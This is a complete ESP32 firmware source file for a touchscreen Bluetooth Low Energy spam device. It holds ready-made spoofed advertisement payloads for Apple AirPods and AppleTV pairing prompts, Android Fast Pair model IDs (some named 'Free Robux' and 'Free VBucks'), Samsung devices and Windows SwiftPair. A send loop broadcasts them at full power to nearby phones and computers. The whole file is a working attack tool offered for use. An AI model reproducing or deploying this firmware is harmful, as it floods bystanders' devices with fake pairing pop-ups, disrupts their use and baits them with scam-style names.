// ESP32 Apple Juice + Android BLE Spam Firmware v4.3
// RFXCORE // TOUCHSCREEN + BUTTON HYBRID VERSION
// TFT 240x320 landscape, монохромная тема

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>

// Конфигурация дисплея 240x320 landscape
#define TFT_BL   4
#define TFT_ROT  1  // Landscape orientation

// ========== TOUCHSCREEN CONFIGURATION ==========
// Using YOUR User_Setup.h pins (21, 23, 19, 18, 5)
#define TOUCH_CS   21    // T_CS
#define TOUCH_IRQ  5     // T_IRQ (optional)

// Create touchscreen object
XPT2046_Touchscreen touchscreen(TOUCH_CS, TOUCH_IRQ);

// Touch calibration values (adjust these if needed)
#define TS_MINX 200
#define TS_MAXX 3700
#define TS_MINY 240
#define TS_MAXY 3800

// Touch variables
bool touchDetected = false;
int touchX = 0, touchY = 0;
unsigned long lastTouchTime = 0;
const int TOUCH_DEBOUNCE = 200;  // ms debounce time

// Touch regions for different screens
struct TouchArea {
  int x1, y1, x2, y2;
  const char* action;
};

// ========== EXISTING BUTTON CODE ==========
const int boutonBoot = 0;
const int ledPin = 2;

// Глобальные объекты
TFT_eSPI tft = TFT_eSPI();
BLEAdvertising *pAdvertising;

// Состояния системы
enum SystemState {
  STATE_MAIN_MENU,     // Главное меню
  STATE_DEVICE_MENU,   // Меню выбора устройства
  STATE_ACTIVE,        // Режим работы
  STATE_INACTIVE,      // Ожидание
  STATE_ABOUT          // Информация о системе
};

SystemState currentState = STATE_MAIN_MENU;
int dernierEtatBouton = HIGH;

// Тайминги для двойного нажатия
unsigned long lastPressTime = 0;
unsigned long lastReleaseTime = 0;
bool waitingForSecondPress = false;
const int DOUBLE_PRESS_DELAY = 500;

// Переменные для отслеживания кнопки
unsigned long debounceTime = 0;
const int DEBOUNCE_DELAY = 50;

// Монохромная палитра
#define WHITE        0xFFFF
#define BLACK        0x0000
#define DARK_GRAY    0x4208
#define MEDIUM_GRAY  0x8410
#define LIGHT_GRAY   0xC618
#define ACCENT_GRAY  0x94B2
#define RED_ACTIVE   0xF800
#define GREEN_ACTIVE 0x07E0
#define BLUE_SELECTED 0x001F

// Структура для статистики
struct Stats {
  uint32_t packets_sent = 0;
  uint32_t last_update = 0;
  uint8_t packets_per_sec = 0;
} stats;

// ========== ВСЕ УСТРОЙСТВА ==========

struct Device {
  uint8_t id;
  const char* name;
  uint8_t type; // 0=Apple, 1=Android, 2=Samsung, 3=Windows
  uint32_t model;
  uint8_t data[31];
  size_t length;
  const char* protocol;
};

// 20 устройств
Device allDevices[] = {
  // Apple (6 устройств)
  {0, "Airpods 1st", 0, 0, {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 31, "Apple"},
  {1, "Airpods Pro", 0, 0, {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 31, "Apple"},
  {2, "Airpods Max", 0, 0, {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 31, "Apple"},
  {3, "AppleTV Setup", 0, 0, {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00}, 23, "Apple"},
  {4, "AppleTV Pair", 0, 0, {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00}, 23, "Apple"},
  {5, "Homepod Setup", 0, 0, {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00}, 23, "Apple"},
  
  // Android Fast Pair (8 устройств)
  {6, "Pixel Buds", 1, 0x92BBBD, {}, 0, "Android"},
  {7, "Bose 700", 1, 0xCD8256, {}, 0, "Android"},
  {8, "JBL Flip", 1, 0x821F66, {}, 0, "Android"},
  {9, "Sony XM5", 1, 0xD446A7, {}, 0, "Android"},
  {10, "Galaxy S21", 1, 0x06AE20, {}, 0, "Android"},
  {11, "Free Robux", 1, 0x77FF67, {}, 0, "Android"},
  {12, "Free VBucks", 1, 0xAA187F, {}, 0, "Android"},
  {13, "Windows 11", 1, 0xFDEE23, {}, 0, "Android"},
  
  // Samsung (4 устройства)
  {14, "Samsung Watch", 2, 0x1A, {0x0F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x1A}, 15, "Samsung"},
  {15, "Samsung TV", 2, 0x01, {0x0F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x01}, 15, "Samsung"},
  {16, "Galaxy Tab", 2, 0x02, {0x0F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x02}, 15, "Samsung"},
  {17, "Samsung Phone", 2, 0x03, {0x0F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x03}, 15, "Samsung"},
  
  // Windows SwiftPair (2 устройства)
  {18, "SwiftPair PC", 3, 0, {}, 0, "Windows"},
  {19, "Random Device", 3, 0, {}, 0, "Windows"}
};

const int TOTAL_DEVICES = 20;
int currentDeviceIndex = 0;
int scrollOffset = 0;
const int VISIBLE_ITEMS = 5;
bool isActive = false;
int delaySeconds = 3;

// Главное меню
enum MainMenuOption {
  MENU_ATTACK,
  MENU_ABOUT,
  MENU_TOTAL
};

int currentMainMenuOption = MENU_ATTACK;

// ========== TOUCHSCREEN FUNCTIONS ==========

// ========== TOUCHSCREEN FUNCTIONS ==========

void initTouchscreen() {
  Serial.println("[TOUCH] Initializing touchscreen...");
  
  touchscreen.begin();
  touchscreen.setRotation(1);  // Match TFT rotation
  
  Serial.println("[TOUCH] Touchscreen ready");
}

void checkTouch() {
  if (touchscreen.touched()) {
    unsigned long currentTime = millis();
    
    if (currentTime - lastTouchTime < TOUCH_DEBOUNCE) return;
    
    TS_Point p = touchscreen.getPoint();
    
    // ===== FIXED COORDINATE TRANSFORMATION =====
    // Try these different mappings until you find the correct one:
    
    // OPTION 1: Direct mapping (simplest - try this first)
    // touchX = map(p.x, TS_MINX, TS_MAXX, 0, 320);
    // touchY = map(p.y, TS_MINY, TS_MAXY, 0, 240);
    
    // OPTION 2: Inverted axes (common with XPT2046)
    // touchX = map(p.x, TS_MINX, TS_MAXX, 320, 0);  // Invert X
    // touchY = map(p.y, TS_MINY, TS_MAXY, 240, 0);  // Invert Y
    
    // OPTION 3: Swap axes (if X and Y are swapped)
    // touchX = map(p.y, TS_MINY, TS_MAXY, 0, 320);  // Y becomes X
    // touchY = map(p.x, TS_MINX, TS_MAXX, 0, 240);  // X becomes Y
    
    // OPTION 4: Most likely fix for your issue (inverted + swapped)
    touchX = map(4095 - p.y, TS_MINY, TS_MAXY, 0, 320);  // Invert Y, use as X
    touchY = map(4095 - p.x, TS_MINX, TS_MAXX, 0, 240);  // Invert X, use as Y
    
    // For landscape orientation (TFT_ROT=1)
    // If Option 4 still doesn't work, try removing the landscape swap:
    // int temp = touchX;
    // touchX = touchY;
    // touchY = 240 - temp;
    
    // OR try this landscape correction:
    // int temp = touchX;
    // touchX = 320 - touchY;
    // touchY = temp;
    
    // ===== END OF FIXED SECTION =====
    
    // Ensure within bounds
    if (touchX < 0) touchX = 0;
    if (touchX > 319) touchX = 319;
    if (touchY < 0) touchY = 0;
    if (touchY > 239) touchY = 239;
    
    lastTouchTime = currentTime;
    touchDetected = true;
    
    // Debug visual feedback
    // tft.fillCircle(touchX, touchY, 3, GREEN_ACTIVE);
    Serial.printf("[TOUCH] Raw: X=%d, Y=%d | Mapped: X=%d, Y=%d\n", p.x, p.y, touchX, touchY);
  } else {
    touchDetected = false;
  }
}

void handleTouchInput() {
  if (!touchDetected) return;
  
  Serial.printf("[TOUCH EVENT] State: %d, X=%d, Y=%d\n", currentState, touchX, touchY);
  
  // Handle touch based on current screen state
  switch(currentState) {
    case STATE_MAIN_MENU:
      handleMainMenuTouch();
      break;
      
    case STATE_DEVICE_MENU:
      handleDeviceMenuTouch();
      break;
      
    case STATE_INACTIVE:
      handleInactiveTouch();
      break;
      
    case STATE_ACTIVE:
      handleActiveTouch();
      break;
      
    case STATE_ABOUT:
      handleAboutTouch();
      break;
  }
  
  touchDetected = false;
}

void handleMainMenuTouch() {
  // Check if touch is in "BLE Attack" button area
  if (touchX >= 50 && touchX <= 270) {
    if (touchY >= 110 && touchY <= 150) {
      // BLE Attack selected
      currentState = STATE_DEVICE_MENU;
      showDeviceMenu();
      Serial.println("[TOUCH] Selected: BLE Attack");
      
      // Visual feedback
      digitalWrite(ledPin, HIGH);
      delay(100);
      digitalWrite(ledPin, LOW);
    }
    else if (touchY >= 170 && touchY <= 210) {
      // About selected
      currentState = STATE_ABOUT;
      showAboutScreen();
      Serial.println("[TOUCH] Selected: About");
      
      // Visual feedback
      digitalWrite(ledPin, HIGH);
      delay(100);
      digitalWrite(ledPin, LOW);
    }
  }
}

void handleDeviceMenuTouch() {
  // Check which device was touched
  for (int i = 0; i < VISIBLE_ITEMS; i++) {
    int deviceIndex = scrollOffset + i;
    if (deviceIndex >= TOTAL_DEVICES) break;
    
    int yPos = 100 + (i * 30);
    int yStart = yPos - 5;
    int yEnd = yStart + 25;
    
    if (touchX >= 20 && touchX <= 300 && 
        touchY >= yStart && touchY <= yEnd) {
      // Device selected
      currentDeviceIndex = deviceIndex;
      currentState = STATE_INACTIVE;
      showMainInterface();
      
      Serial.printf("[TOUCH] Selected device: %s\n", allDevices[currentDeviceIndex].name);
      
      // Double flash LED for confirmation
      for (int j = 0; j < 2; j++) {
        digitalWrite(ledPin, HIGH);
        delay(80);
        digitalWrite(ledPin, LOW);
        delay(80);
      }
      break;
    }
  }
  
  // Check for scroll area (right side)
  if (touchX >= 300 && touchX <= 320 && touchY >= 100 && touchY <= 200) {
    // Scroll down
    scrollOffset++;
    if (scrollOffset > TOTAL_DEVICES - VISIBLE_ITEMS) {
      scrollOffset = TOTAL_DEVICES - VISIBLE_ITEMS;
    }
    showDeviceMenu();
    Serial.printf("[TOUCH] Scrolled to offset: %d\n", scrollOffset);
  }
}

void handleInactiveTouch() {
  // Check if touch is in STATUS area to start attack
  if (touchX >= 10 && touchX <= 150 && touchY >= 50 && touchY <= 130) {
    // Start attack
    isActive = true;
    currentState = STATE_ACTIVE;
    digitalWrite(ledPin, HIGH);
    updateStatus(true);
    Serial.println("[TOUCH] Started attack");
  }
  // Check if touch is in DEVICE area to go back to device selection
  else if (touchX >= 50 && touchX <= 270 && touchY >= 140 && touchY <= 240) {
    currentState = STATE_DEVICE_MENU;
    showDeviceMenu();
    Serial.println("[TOUCH] Back to device selection");
  }
}

void handleActiveTouch() {
  // Check if touch is in STATUS area to stop attack
  if (touchX >= 10 && touchX <= 150 && touchY >= 50 && touchY <= 130) {
    // Stop attack
    isActive = false;
    currentState = STATE_INACTIVE;
    pAdvertising->stop();
    digitalWrite(ledPin, LOW);
    updateStatus(false);
    Serial.println("[TOUCH] Stopped attack");
  }
}

void handleAboutTouch() {
  // Any touch on About screen returns to main menu
  currentState = STATE_MAIN_MENU;
  showMainMenu();
  Serial.println("[TOUCH] Returned to main menu");
  
  // Visual feedback
  digitalWrite(ledPin, HIGH);
  delay(100);
  digitalWrite(ledPin, LOW);
}

// ========== ЛОГИКА КНОПКИ (ВАША ОРИГИНАЛЬНАЯ) ==========

void handleButton() {
  int etatBouton = digitalRead(boutonBoot);
  unsigned long currentTime = millis();
  
  // Дебаунс
  if (currentTime - debounceTime < DEBOUNCE_DELAY) {
    dernierEtatBouton = etatBouton;
    return;
  }
  
  // Нажатие (HIGH -> LOW)
  if (etatBouton == LOW && dernierEtatBouton == HIGH) {
    debounceTime = currentTime;
    lastPressTime = currentTime;
    
    // Проверка двойного нажатия
    if (waitingForSecondPress && (currentTime - lastReleaseTime) < DOUBLE_PRESS_DELAY) {
      waitingForSecondPress = false;
      
      // Двойное нажатие
      if (currentState == STATE_DEVICE_MENU) {
        // Выбор устройства
        currentState = STATE_INACTIVE;
        showMainInterface();
        
        // Световая обратная связь
        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
        delay(100);
        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
      }
      else if (currentState == STATE_MAIN_MENU) {
        // Выбор опции
        if (currentMainMenuOption == MENU_ATTACK) {
          currentState = STATE_DEVICE_MENU;
          showDeviceMenu();
        }
        else if (currentMainMenuOption == MENU_ABOUT) {
          currentState = STATE_ABOUT;
          showAboutScreen();
        }
        
        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
      }
    }
  }
  
  // Отпускание (LOW -> HIGH)
  if (etatBouton == HIGH && dernierEtatBouton == LOW) {
    debounceTime = currentTime;
    lastReleaseTime = currentTime;
    
    // Определение типа нажатия
    unsigned long pressDuration = currentTime - lastPressTime;
    
    if (pressDuration > 50 && pressDuration < 300) {  // Короткое
      waitingForSecondPress = true;
    } else if (pressDuration >= 3000) {
      // Длинное нажатие
      waitingForSecondPress = false;
      handleLongPress();
    }
  }
  
  // Сброс ожидания двойного нажатия
  if (waitingForSecondPress && (currentTime - lastReleaseTime) > DOUBLE_PRESS_DELAY) {
    waitingForSecondPress = false;
    handleSinglePress();
  }
  
  dernierEtatBouton = etatBouton;
}

void handleSinglePress() {
  if (currentState == STATE_MAIN_MENU) {
    // Переключение опций в главном меню
    currentMainMenuOption = (currentMainMenuOption + 1) % MENU_TOTAL;
    showMainMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(30);
    digitalWrite(ledPin, LOW);
  }
  else if (currentState == STATE_DEVICE_MENU) {
    // Переключение устройства
    currentDeviceIndex = (currentDeviceIndex + 1) % TOTAL_DEVICES;
    
    // Автопрокрутка
    if (currentDeviceIndex >= scrollOffset + VISIBLE_ITEMS) {
      scrollOffset++;
    } else if (currentDeviceIndex < scrollOffset) {
      scrollOffset--;
    }
    
    if (scrollOffset < 0) scrollOffset = 0;
    if (scrollOffset > TOTAL_DEVICES - VISIBLE_ITEMS) scrollOffset = TOTAL_DEVICES - VISIBLE_ITEMS;
    
    showDeviceMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(30);
    digitalWrite(ledPin, LOW);
  } 
  else if (currentState == STATE_INACTIVE) {
    // Старт атаки
    isActive = true;
    currentState = STATE_ACTIVE;
    digitalWrite(ledPin, HIGH);
    updateStatus(true);
  }
  else if (currentState == STATE_ACTIVE) {
    // Стоп атаки
    isActive = false;
    currentState = STATE_INACTIVE;
    pAdvertising->stop();
    digitalWrite(ledPin, LOW);
    updateStatus(false);
  }
  else if (currentState == STATE_ABOUT) {
    // Возврат в меню
    currentState = STATE_MAIN_MENU;
    showMainMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
  }
}

void handleLongPress() {
  if (currentState == STATE_ACTIVE) {
    pAdvertising->stop();
    digitalWrite(ledPin, LOW);
  }
  
  // Возврат в главное меню
  if (currentState != STATE_ABOUT) {
    currentState = STATE_MAIN_MENU;
    isActive = false;
    showMainMenu();
  }
  
  // Индикация
  for (int i = 0; i < 3; i++) {
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
    delay(100);
  }
}

// ========== ИНТЕРФЕЙС ==========

void initDisplay() {
  tft.init();
  tft.setRotation(TFT_ROT);
  tft.fillScreen(BLACK);
  
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  
  // Верхняя панель
  tft.fillRect(0, 0, 320, 40, BLACK);
  tft.setTextColor(WHITE, BLACK);
  tft.setTextSize(2);
  
  // Индикатор батареи
  tft.fillRoundRect(270, 10, 40, 20, 3, MEDIUM_GRAY);
  tft.fillRoundRect(310, 13, 5, 14, 1, MEDIUM_GRAY);
  tft.fillRoundRect(272, 12, 36, 16, 2, BLACK);
  tft.fillRoundRect(272, 12, 15, 16, 2, ACCENT_GRAY);
  tft.setTextColor(WHITE, MEDIUM_GRAY);
  tft.drawString("41%", 275, 13, 1);
  
  // Логотип
  tft.setTextColor(LIGHT_GRAY, BLACK);
}

void showMainMenu() {
  tft.fillRect(0, 41, 320, 238, BLACK);
  
  // Заголовок
  tft.setTextColor(WHITE, BLACK);
  tft.setTextSize(2);
  tft.drawCentreString("Apple 32", 160, 50, 2);
  
  // Инструкции
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.setTextSize(1);
  
  // Опция BLE Attack
  int yPosAttack = 120;
  if (currentMainMenuOption == MENU_ATTACK) {
    tft.fillRoundRect(50, yPosAttack - 10, 220, 40, 8, BLUE_SELECTED);
    tft.setTextColor(WHITE, BLUE_SELECTED);
  } else {
    tft.fillRoundRect(50, yPosAttack - 10, 220, 40, 8, DARK_GRAY);
    tft.setTextColor(LIGHT_GRAY, DARK_GRAY);
  }
  
  tft.setTextSize(2);
  tft.drawCentreString("AppleSpoof", 160, yPosAttack, 1);
  
  // Опция About
  int yPosAbout = 180;
  if (currentMainMenuOption == MENU_ABOUT) {
    tft.fillRoundRect(50, yPosAbout - 10, 220, 40, 8, BLUE_SELECTED);
    tft.setTextColor(WHITE, BLUE_SELECTED);
  } else {
    tft.fillRoundRect(50, yPosAbout - 10, 220, 40, 8, DARK_GRAY);
    tft.setTextColor(LIGHT_GRAY, DARK_GRAY);
  }
  
  tft.setTextSize(2);
  tft.drawCentreString("About System", 160, yPosAbout, 1);
  
  // Инструкции внизу
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.setTextSize(1);
  tft.drawCentreString("Touch screen or use BOOT button", 160, 260, 2);
}

void showDeviceMenu() {
  tft.fillRect(0, 41, 320, 238, BLACK);
  
  // Заголовок
  tft.setTextColor(WHITE, BLACK);
  tft.setTextSize(2);
  tft.drawCentreString("SELECT DEVICE", 160, 50, 2);
  
  // Инструкции
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.setTextSize(1);
  
  // Список устройств
  for (int i = 0; i < VISIBLE_ITEMS; i++) {
    int deviceIdx = scrollOffset + i;
    if (deviceIdx >= TOTAL_DEVICES) break;
    
    int yPos = 100 + (i * 30);
    
    // Выделение текущего устройства
    if (deviceIdx == currentDeviceIndex) {
      tft.fillRoundRect(20, yPos - 5, 280, 25, 5, BLUE_SELECTED);
      tft.setTextColor(WHITE, BLUE_SELECTED);
    } else {
      tft.fillRoundRect(20, yPos - 5, 280, 25, 5, DARK_GRAY);
      tft.setTextColor(LIGHT_GRAY, DARK_GRAY);
    }
    
    // Имя устройства
    tft.setTextSize(1);
    tft.drawCentreString(allDevices[deviceIdx].name, 160, yPos, 2);
  }
  
  // Индикатор прокрутки
  if (TOTAL_DEVICES > VISIBLE_ITEMS) {
    int scrollBarHeight = 100;
    int scrollBarY = 100;
    int scrollPos = scrollBarY + (scrollOffset * scrollBarHeight / TOTAL_DEVICES);
    
    tft.fillRect(300, scrollBarY, 5, scrollBarHeight, DARK_GRAY);
    tft.fillRect(300, scrollPos, 5, 10, ACCENT_GRAY);
  }
  
  // Номер устройства
  tft.setTextColor(WHITE, BLACK);
  tft.drawCentreString("Device " + String(currentDeviceIndex + 1) + "/" + String(TOTAL_DEVICES), 160, 260, 2);
  
  // Инструкции
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.drawCentreString("Touch device or button to select", 160, 280, 1);
}

void showAboutScreen() {
  tft.fillRect(0, 41, 320, 238, BLACK);
  
  // Заголовок
  tft.setTextColor(WHITE, BLACK);
  tft.setTextSize(2);
  tft.drawCentreString("SYSTEM INFO", 160, 50, 2);
  
  // Информация
  tft.setTextColor(LIGHT_GRAY, BLACK);
  tft.setTextSize(1);
  
  tft.drawCentreString("Multi-Protocol BLE v4.3", 160, 80, 2);
  tft.drawCentreString("Apple + Android + Samsung", 160, 100, 2);
  tft.drawCentreString("20 Devices Total", 160, 120, 2);
  tft.drawCentreString("TFT 240x320 Landscape + Touch", 160, 140, 2);
  tft.drawCentreString("ESP32 Dev Board", 160, 160, 2);
  
  // Линия
  tft.drawFastHLine(60, 185, 200, MEDIUM_GRAY);
  
  // Техническая информация
  tft.setTextColor(WHITE, BLACK);
  tft.drawCentreString("Technical Specs", 160, 195, 2);
  
  tft.setTextColor(LIGHT_GRAY, BLACK);
  tft.drawCentreString("BLE Power: +9dBm", 160, 215, 1);
  tft.drawCentreString("Packet Interval: 3s", 160, 230, 1);
  tft.drawCentreString("Touch + Button Control", 160, 245, 1);
  
  // Инструкции
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.drawCentreString("Touch anywhere or press button to return", 160, 265, 1);
  tft.drawCentreString("Hold 3s: Main menu from any screen", 160, 280, 1);
}

void showMainInterface() {
  tft.fillRect(0, 41, 320, 238, BLACK);
  
  // Статус
  tft.fillRoundRect(10, 50, 140, 80, 5, DARK_GRAY);
  tft.drawRoundRect(10, 50, 140, 80, 5, MEDIUM_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.drawCentreString("STATUS", 80, 55, 2);
  
  // Статистика
  tft.fillRoundRect(170, 50, 140, 80, 5, DARK_GRAY);
  tft.drawRoundRect(170, 50, 140, 80, 5, MEDIUM_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.drawCentreString("STATS", 240, 55, 2);
  
  // Устройство
  tft.fillRoundRect(50, 140, 220, 100, 5, DARK_GRAY);
  tft.drawRoundRect(50, 140, 220, 100, 5, MEDIUM_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.drawCentreString("DEVICE", 160, 145, 2);
  
  updateStatus(false);
  updateDeviceInfo();
  updateStats();
  
  // Инструкции
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.setTextSize(1);
  tft.drawCentreString("Touch STATUS: Start/Stop | Touch DEVICE: Change", 160, 260, 1);
}

void updateStatus(bool active) {
  tft.fillRect(30, 80, 100, 30, DARK_GRAY);
  tft.setTextColor(active ? GREEN_ACTIVE : RED_ACTIVE, DARK_GRAY);
  tft.setTextSize(3);
  
  if (active) {
    tft.drawCentreString("ACTIVE", 80, 85, 3);
    tft.fillCircle(80, 120, 8, GREEN_ACTIVE);
  } else {
    tft.drawCentreString("INACTIVE", 80, 85, 3);
    tft.fillCircle(80, 120, 8, DARK_GRAY);
    tft.drawCircle(80, 120, 8, MEDIUM_GRAY);
  }
}

void updateDeviceInfo() {
  Device* device = &allDevices[currentDeviceIndex];
  
  tft.fillRect(60, 165, 200, 60, DARK_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.setTextSize(2);
  
  tft.drawCentreString(device->name, 160, 170, 2);
  
  tft.setTextColor(LIGHT_GRAY, DARK_GRAY);
  tft.setTextSize(1);
  tft.drawCentreString(device->protocol, 160, 195, 2);
  tft.drawCentreString("Touch to change device", 160, 210, 2);
}

void updateStats() {
  if (millis() - stats.last_update >= 1000) {
    stats.packets_per_sec = stats.packets_sent - (stats.last_update ? stats.packets_sent : 0);
    stats.last_update = millis();
  }
  
  tft.fillRect(180, 75, 120, 40, DARK_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.setTextSize(2);
  
  char buffer[20];
  sprintf(buffer, "PKTS: %lu", stats.packets_sent);
  tft.drawCentreString(buffer, 240, 75, 1);
  
  sprintf(buffer, "PPS: %d", stats.packets_per_sec);
  tft.drawCentreString(buffer, 240, 95, 1);
}

// ========== ФУНКЦИИ ОТПРАВКИ ПАКЕТОВ ==========

void sendAttackPacket() {
  Device* device = &allDevices[currentDeviceIndex];
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  
  if (device->type == 0) {
    // Apple Juice - используем оригинальные данные
    String appleData = "";
    for (size_t i = 0; i < device->length; i++) {
      appleData += (char)device->data[i];
    }
    advertisementData.addData(appleData);
  }
  else if (device->type == 1) {
    // Android Fast Pair
    uint32_t model = device->model;
    String fpData = "";
    fpData += (char)0x03;
    fpData += (char)0x03;
    fpData += (char)0x2C;
    fpData += (char)0xFE;
    fpData += (char)0x06;
    fpData += (char)0x16;
    fpData += (char)0x2C;
    fpData += (char)0xFE;
    fpData += (char)((model >> 16) & 0xFF);
    fpData += (char)((model >> 8) & 0xFF);
    fpData += (char)(model & 0xFF);
    fpData += (char)0x00;
    fpData += (char)0x00;
    fpData += (char)0x00;
    
    advertisementData.addData(fpData);
  }
  else if (device->type == 2) {
    // Samsung
    String samsungData = "";
    for (size_t i = 0; i < device->length; i++) {
      samsungData += (char)device->data[i];
    }
    advertisementData.addData(samsungData);
  }
  else if (device->type == 3) {
    // Windows SwiftPair
    String spData = "";
    spData += (char)0x0C;
    spData += (char)0xFF;
    spData += (char)0x06;
    spData += (char)0x00;
    spData += (char)0x03;
    spData += (char)0x00;
    spData += (char)0x80;
    spData += (char)0x57;  // W
    spData += (char)0x69;  // i
    spData += (char)0x6E;  // n
    spData += (char)0x64;  // d
    spData += (char)0x6F;  // o
    spData += (char)0x77;  // w
    
    advertisementData.addData(spData);
  }
  
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  stats.packets_sent++;
  delay(100);
  pAdvertising->stop();
  
  if (stats.packets_sent % 5 == 0) {
    updateStats();
  }
}

// ========== SETUP И LOOP ==========

void setup() {
  Serial.begin(115200);
  delay(100);
  
  Serial.println("[+] Multi-Protocol BLE Firmware v4.3 + TOUCH");
  Serial.println("[+] Apple + Android + Samsung + Windows");
  Serial.println("[+] Total devices: " + String(TOTAL_DEVICES));
  
  // Инициализация пинов
  pinMode(boutonBoot, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);
  
  // Инициализация дисплея
  initDisplay();
  
  // Инициализация touchscreen
  initTouchscreen();
  
  // Показать главное меню
  showMainMenu();
  
  // Инициализация BLE
  BLEDevice::init("BLE-Multi-FW");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  
  Serial.println("[+] System ready");
  Serial.println("[+] Touch screen or use BOOT button");
  Serial.println("[+] Hold button 3s: Main menu");
}

void loop() {
  // Обработка кнопки (ваша оригинальная логика)
  handleButton();
  
  // Обработка касаний
  checkTouch();
  handleTouchInput();
  
  // Отправка пакетов
  if (currentState == STATE_ACTIVE && isActive) {
    static uint32_t last_packet = 0;
    
    if (millis() - last_packet >= (delaySeconds * 1000)) {
      sendAttackPacket();
      last_packet = millis();
      
      // Мигание LED
      static bool ledState = true;
      digitalWrite(ledPin, ledState);
      ledState = !ledState;
    }
  }
  
  // Обновление статистики
  static uint32_t last_stats_update = 0;
  if (millis() - last_stats_update >= 1000) {
    if (currentState == STATE_INACTIVE || currentState == STATE_ACTIVE) {
      updateStats();
    }
    last_stats_update = millis();
  }
  
  // Мигание индикатора двойного нажатия
  static uint32_t last_blink = 0;
  if (waitingForSecondPress && currentState == STATE_DEVICE_MENU && (millis() - last_blink > 500)) {
    last_blink = millis();
    tft.fillCircle(160, 275, 3, (millis() % 1000 < 500) ? GREEN_ACTIVE : BLACK);
  }
  
  delay(10);
}
